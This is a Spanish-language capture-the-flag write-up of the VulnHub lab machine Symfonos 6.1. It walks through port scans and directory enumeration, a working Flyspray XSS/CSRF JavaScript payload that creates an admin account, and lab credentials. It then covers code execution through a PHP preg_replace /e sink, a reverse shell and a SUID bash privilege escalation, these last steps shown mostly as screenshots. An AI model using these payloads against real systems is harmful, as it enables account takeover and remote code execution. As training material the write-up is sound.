# Symphonos 6.1

----
- Tags: #ethical #web #htb #linux #VulnHub 
----
Primero hacemos un escaneo a la máquina 

Vemos varios puertos abiertos, que parecen ser web y ssh

~~~
nmap 192.168.100.51 -sVC
Starting Nmap 7.93 ( https://nmap.org ) at 2023-12-06 14:02 CST
Nmap scan report for 192.168.100.51
Host is up (0.00031s latency).
Not shown: 995 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 0ead33fc1a1e8554641339146809c170 (RSA)
|   256 54039b4855deb32b0a78904ab31ffacd (ECDSA)
|_  256 4e0ce63d5c0809f4114885a2e7fb8fb7 (ED25519)
80/tcp   open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.6.40)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.6.40
| http-methods: 
|_  Potentially risky methods: TRACE
3000/tcp open  ppp?
| fingerprint-strings: 
|   GenericLines, Help: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 200 OK
|     Content-Type: text/html; charset=UTF-8
|     Set-Cookie: lang=en-US; Path=/; Max-Age=2147483647
|     Set-Cookie: i_like_gitea=e9459e3a34f23288; Path=/; HttpOnly
|     Set-Cookie: _csrf=77e-t4hlSv9aCDUEJBdIgMkKqJM6MTcwMTg0NjkxMTQwMTU2MjE1Ng; Path=/; Expires=Thu, 07 Dec 2023 07:15:11 GMT; HttpOnly
|     X-Frame-Options: SAMEORIGIN
|     Date: Wed, 06 Dec 2023 07:15:11 GMT
|     <!DOCTYPE html>
|     <html lang="en-US">
|     <head data-suburl="">
|     <meta charset="utf-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1">
|     <meta http-equiv="x-ua-compatible" content="ie=edge">
|     <title> Symfonos6</title>
|     <link rel="manifest" href="/manifest.json" crossorigin="use-credentials">
|     <script>
|     ('serviceWorker' in navigator) {
|     navigator.serviceWorker.register('/serviceworker.js').then(function(registration) {
|     console.info('ServiceWorker registration successful with scope: ', registrat
|   HTTPOptions: 
|     HTTP/1.0 404 Not Found
|     Content-Type: text/html; charset=UTF-8
|     Set-Cookie: lang=en-US; Path=/; Max-Age=2147483647
|     Set-Cookie: i_like_gitea=95a626d68b5489d1; Path=/; HttpOnly
|     Set-Cookie: _csrf=Qq4RERPMScw6NiXnBT3KLDPz5rM6MTcwMTg0NjkxNzM2MTIyNTQxNQ; Path=/; Expires=Thu, 07 Dec 2023 07:15:17 GMT; HttpOnly
|     X-Frame-Options: SAMEORIGIN
|     Date: Wed, 06 Dec 2023 07:15:17 GMT
|     <!DOCTYPE html>
|     <html lang="en-US">
|     <head data-suburl="">
|     <meta charset="utf-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1">
|     <meta http-equiv="x-ua-compatible" content="ie=edge">
|     <title>Page Not Found - Symfonos6</title>
|     <link rel="manifest" href="/manifest.json" crossorigin="use-credentials">
|     <script>
|     ('serviceWorker' in navigator) {
|     navigator.serviceWorker.register('/serviceworker.js').then(function(registration) {
|_    console.info('ServiceWorker registration successful
3306/tcp open  mysql   MariaDB (unauthorized)
5000/tcp open  upnp?
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 404 Not Found
|     Content-Type: text/plain
|     Date: Wed, 06 Dec 2023 07:15:44 GMT
|     Content-Length: 18
|     page not found
|   GenericLines, Help, Kerberos, LDAPSearchReq, LPDString, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 404 Not Found
|     Content-Type: text/plain
|     Date: Wed, 06 Dec 2023 07:15:11 GMT
|     Content-Length: 18
|     page not found
|   HTTPOptions: 
|     HTTP/1.0 404 Not Found
|     Content-Type: text/plain
|     Date: Wed, 06 Dec 2023 07:15:28 GMT
|     Content-Length: 18
|_    page not found
~~~

Enumeramos subdominios, el puerto 5000 parece ser una API

~~~
gobuster dir -k -u http://192.168.100.51:3000/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --no-error
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.100.51:3000/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2023/12/06 14:03:07 Starting gobuster in directory enumeration mode
===============================================================
/img                  (Status: 302) [Size: 27] [--> /img]
/admin                (Status: 302) [Size: 34] [--> /user/login]
/issues               (Status: 302) [Size: 34] [--> /user/login]
/css                  (Status: 302) [Size: 27] [--> /css]       
/avatars              (Status: 302) [Size: 31] [--> /avatars]   
/js                   (Status: 302) [Size: 26] [--> /js]        
/vendor               (Status: 302) [Size: 30] [--> /vendor]    
/explore              (Status: 302) [Size: 37] [--> /explore/repos]
/debug                (Status: 200) [Size: 160]                    
/milestones           (Status: 302) [Size: 34] [--> /user/login]   
/%ec%bb%b4%ed%93%a8%ed%84%b0 (Status: 500) [Size: 8826]  

gobuster dir -k -u http://192.168.100.51/ -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.100.51/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-1.0.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2023/12/06 14:20:53 Starting gobuster in directory enumeration mode
===============================================================
/posts                (Status: 301) [Size: 236] [--> http://192.168.100.51/posts/]
/flyspray             (Status: 301) [Size: 239] [--> http://192.168.100.51/flyspray/]
                                                                                     
===============================================================
2023/12/06 14:21:09 Finished
===============================================================
~~~


Los posts no tienen nada 

![Pasted image 20231206142414.png](https://github.com/Hamibubu/Writeups/blob/main/Symphonos%206.1/Pasted%20image%2020231206142414.png?raw=true)

Entramos a flyspray y parece ser una web de project management, vemos este comentario 

![Pasted image 20231206142526.png](https://github.com/Hamibubu/Writeups/blob/main/Symphonos%206.1/Pasted%20image%2020231206142526.png?raw=true)

Nos podemos hacer login y registrarnos, además podemos comentar en ese lugar, después de probar file upload con php, sqli, comienzo a testear xss, que al parecer es una vulnerbailidad recurrente en flyspray

![Pasted image 20231206142959.png](https://github.com/Hamibubu/Writeups/blob/main/Symphonos%206.1/Pasted%20image%2020231206142959.png?raw=true)

Parece también que la página nos da 4 cookies 

![Pasted image 20231206143041.png](https://github.com/Hamibubu/Writeups/blob/main/Symphonos%206.1/Pasted%20image%2020231206143041.png?raw=true)

Logramos dar con un xss 

![Pasted image 20231206144228.png](https://github.com/Hamibubu/Writeups/blob/main/Symphonos%206.1/Pasted%20image%2020231206144228.png?raw=true)

Investigando encontramos que para la versión de 1.04 hay una vuln de xsrf

Description :

A vulnerability has been discovered in Flyspray , which can be
exploited by malicious people to conduct cross-site scripting attacks. Input
passed via the 'real_name' parameter to '/index.php?do=myprofile' is not
properly sanitised before being returned to the user. This can be exploited
to execute arbitrary HTML and script code in a user's browser session in
context of an affected site.

The script is executed on the parameter page AND on any page that allow the
user to put a comment.


This XSS vector allow to execute scripts to gather the CSRF token

and submit a form to create a new admin


~~~
var tok = document.getElementsByName('csrftoken')[0].value;

var txt = '<form method="POST" id="hacked_form" action="index.php?do=admin&area=newuser">'
txt += '<input type="hidden" name="action" value="admin.newuser"/>'
txt += '<input type="hidden" name="do" value="admin"/>'
txt += '<input type="hidden" name="area" value="newuser"/>'
txt += '<input type="hidden" name="user_name" value="hacker"/>'
txt += '<input type="hidden" name="csrftoken" value="' + tok + '"/>'
txt += '<input type="hidden" name="user_pass" value="12345678"/>'
txt += '<input type="hidden" name="user_pass2" value="12345678"/>'
txt += '<input type="hidden" name="real_name" value="root"/>'
txt += '<input type="hidden" name="email_address" value="root@root.com"/>'
txt += '<input type="hidden" name="verify_email_address" value=" root@root.com"/>'
txt += '<input type="hidden" name="jabber_id" value=""/>'
txt += '<input type="hidden" name="notify_type" value="0"/>'
txt += '<input type="hidden" name="time_zone" value="0"/>'
txt += '<input type="hidden" name="group_in" value="1"/>'
txt += '</form>'

var d1 = document.getElementById('menu');
d1.insertAdjacentHTML('afterend', txt);
document.getElementById("hacked_form").submit();
~~~

Así que intentamos, hosteamos un server con el script de javascript

![Pasted image 20231206150812.png](https://github.com/Hamibubu/Writeups/blob/main/Symphonos%206.1/Pasted%20image%2020231206150812.png?raw=true)

Con esto se crea el usuario hacker y contraseña 12345678 con privilegios administrativos

Con eso buscando en el perfil encontramos las siguientes credenciales para gitea

achilles:h2sBr9gryBunKdF9

Al parecer ssh no sirve.

Con esto encontramos 2 cosas, una api y lo que parecer ser el manejador de blogs

![Pasted image 20231206151041.png](https://github.com/Hamibubu/Writeups/blob/main/Symphonos%206.1/Pasted%20image%2020231206151041.png?raw=true)

Leyendo la api parece que se sirve en el puerto 5000 en /ls204g

Parece que genera un token con jwt y tiene los siguientes endpoints

- /ls204g/v1.0/ping
- /ls204g/v1.0/auth/login
- /ls204g/v1.0/auth/check
- /ls204g/v1.0/posts
	- POST /
	- GET /
	- GET /:id
	- DELETE /:id
	- PATCH /:id
- Lo que primero podemos hacer es intentar logearnos, usaremos postman para más facilidad

![Pasted image 20231206151554.png](https://github.com/Hamibubu/Writeups/blob/main/Symphonos%206.1/Pasted%20image%2020231206151554.png?raw=true)

Vemos que para el login pide

![Pasted image 20231206151642.png](https://github.com/Hamibubu/Writeups/blob/main/Symphonos%206.1/Pasted%20image%2020231206151642.png?raw=true)

Hacemos login con las mismas contraseñas y nos regresa el token de sesión

![Pasted image 20231206151817.png](https://github.com/Hamibubu/Writeups/blob/main/Symphonos%206.1/Pasted%20image%2020231206151817.png?raw=true)

Ahora con esto podemos calar hacer un PATCH

Podemos ver los cambios que hay, en la api solamente parece modificarse el texto

![Pasted image 20231206151936.png](https://github.com/Hamibubu/Writeups/blob/main/Symphonos%206.1/Pasted%20image%2020231206151936.png?raw=true)

Podemos modificar el texto mostrado en posts
![Pasted image 20231206152019.png](https://github.com/Hamibubu/Writeups/blob/main/Symphonos%206.1/Pasted%20image%2020231206152019.png?raw=true)
![Pasted image 20231206152045.png](https://github.com/Hamibubu/Writeups/blob/main/Symphonos%206.1/Pasted%20image%2020231206152045.png?raw=true)

Vamos a leer en el codigo que podemos hacer con eso

Investigando vemos este código de php ara verificar el contenido

~~~
        <?php
        while ($row = mysqli_fetch_assoc($result)) {
		$content = htmlspecialchars($row['text']);
		
		echo $content;
	
		preg_replace('/.*/e',$content, "Win");
        }
	?>
~~~

Nadamas que al parecer nos quita los special chars, pero el preg_replace, puede ejecutar código al parecer.

![Pasted image 20231206152347.png](https://github.com/Hamibubu/Writeups/blob/main/Symphonos%206.1/Pasted%20image%2020231206152347.png?raw=true)

Podemos ver que efectivamente lo hace

![Pasted image 20231206152411.png](https://github.com/Hamibubu/Writeups/blob/main/Symphonos%206.1/Pasted%20image%2020231206152411.png?raw=true)

Usamos system('id');

![Pasted image 20231206152446.png](https://github.com/Hamibubu/Writeups/blob/main/Symphonos%206.1/Pasted%20image%2020231206152446.png?raw=true)

Generamos un revshell con base64

![Pasted image 20231206152650.png](https://github.com/Hamibubu/Writeups/blob/main/Symphonos%206.1/Pasted%20image%2020231206152650.png?raw=true)

Cambiamos de usuario y es la misma contraseña para achilles, generamos una llave ssh y la agregamos a authorized_keys

![Pasted image 20231206152912.png](https://github.com/Hamibubu/Writeups/blob/main/Symphonos%206.1/Pasted%20image%2020231206152912.png?raw=true)

Ahora entramos cómodamente por ssh

![Pasted image 20231206152946.png](https://github.com/Hamibubu/Writeups/blob/main/Symphonos%206.1/Pasted%20image%2020231206152946.png?raw=true)

Viendo lo que hay al parecer podemos ejecutar scripts de go con sudo 

![Pasted image 20231206153016.png](https://github.com/Hamibubu/Writeups/blob/main/Symphonos%206.1/Pasted%20image%2020231206153016.png?raw=true)

Así que es un ez root

![Pasted image 20231206153103.png](https://github.com/Hamibubu/Writeups/blob/main/Symphonos%206.1/Pasted%20image%2020231206153103.png?raw=true)

Hacemos a bash un binario SUID

![Pasted image 20231206153200.png](https://github.com/Hamibubu/Writeups/blob/main/Symphonos%206.1/Pasted%20image%2020231206153200.png?raw=true)

GG!

